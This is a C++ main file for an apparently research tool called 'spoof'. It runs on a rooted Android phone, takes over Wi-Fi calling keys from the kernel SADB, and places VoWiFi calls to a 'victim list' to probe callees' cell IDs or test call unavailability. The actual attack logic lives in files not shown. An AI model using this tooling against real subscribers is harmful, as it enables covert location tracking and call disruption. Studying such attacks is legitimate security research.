#include <linux/pfkeyv2.h>
#include <signal.h>

#include <array>
#include <chrono>
#include <cxxopts.hpp>
#include <iostream>
#include <span>
#include <string>
#include <thread>
#include <utility>

#include "iface.h"
#include "sadb.h"
#include "session.h"
#include "util.h"
#include "application.h"

const std::string epdgInterface = "epdg";
const std::string wlan0Interface = "wlan0";
const std::string configFolder = "config";


int main(int argc, char* argv[]) {
  signal(SIGINT, [](int) { util::context.shouldStop = true; });
  cxxopts::Options options(argv[0], "Making phone calls via VoWiFi.");
  // clang-format off
  options.add_options()
    ("r,remote-cellid-prober", "Remote cellid prober", cxxopts::value<bool>()->default_value("false"))
    ("l,local-cellid-prober", "Local cellid prober", cxxopts::value<bool>()->default_value("false"))
    ("a,rl-assisted-remote-cellid-prober", "RL assisted remote cellid prober", cxxopts::value<bool>()->default_value("false"))
    ("u,unavailability-eval", "Evaluate one call unavailability", cxxopts::value<bool>()->default_value("false"))
    ("d,detect-eval", "Evaluate one call detect", cxxopts::value<bool>()->default_value("false"))
    ("e,enable-input", "Enable manual input of phone numbers", cxxopts::value<bool>()->default_value("false"))
    ("v,verbose", "Verbose output", cxxopts::value<int>()->default_value("1"))
    ("h,help", "Help", cxxopts::value<bool>());
  // clang-format on
  auto result = options.parse(argc, argv);
  if (result.count("help")) {
    std::cout << options.help() << std::endl;
    std::cout << "Example:\n"
              << "  ./spoof -a -e : adaptive remote call to a number with training and testing\n"
              << "  ./spoof -a: adaptive remote call with training and testing\n"
              << "  ./spoof: local malware trigger the remote call detection\n"
              << std::endl;
    exit(EXIT_SUCCESS);
  }


  // Initialize context
  util::context.remoteCellIDProber = result["remote-cellid-prober"].as<bool>();
  util::context.localCellIDProber = result["local-cellid-prober"].as<bool>();
  util::context.rlRemoteCellIDProber = result["rl-assisted-remote-cellid-prober"].as<bool>();
  util::context.unavailabilityEval = result["unavailability-eval"].as<bool>();
  util::context.detectEval = result["detect-eval"].as<bool>();

  util::context.verbose = result["verbose"].as<int>();
  util::context.calleeId = createVictimList(result["enable-input"].as<bool>());
  util::context.callerId = "";

  std::string carrier = readCarrierName();
  if (carrier.empty()) {
    std::cerr << "Attacker phone's carrier name not found" << std::endl;
    std::cerr << "Please check the SIM card is inserted or not" << std::endl;
    exit(EXIT_FAILURE);
  }
  std::cout << "Using carrier, " << carrier << std::endl;
  util::context.configFolder = configFolder + "/" + carrier;



  std::cout << "\nTurning on Wi-Fi..." << std::endl;
  system("settings put global airplane_mode_on 1 > /dev/null 2>&1");
  system("su -c am broadcast -a android.intent.action.AIRPLANE_MODE > /dev/null 2>&1");
  std::this_thread::sleep_for(std::chrono::milliseconds(5000));
  system("svc wifi enable");
  while (testInterface(wlan0Interface)) {
    std::this_thread::sleep_for(std::chrono::milliseconds(200));
  }
  std::cout << "\nWi-Fi is on. Turning on Wi-Fi Calling Service" << std::endl;
  Session session(waitEpgdInterfaceUp(epdgInterface));



  std::optional<ESPConfig> config;
  int i = 0;
  for (; i < 100; ++i) {
    config = getConfigFromSADB();
    if (config) break;
    std::this_thread::sleep_for(std::chrono::milliseconds(100));
  }
  std::cout << "\nWi-Fi Calling Service is on. Initializing Wi-Fi Calling Packets..." << std::endl;

  if (config) {
    if (util::context.verbose) std::cout << *config << std::endl;
    Application application(session);
    session.run(std::move(*config), application);
  }
  

  return 0;
}
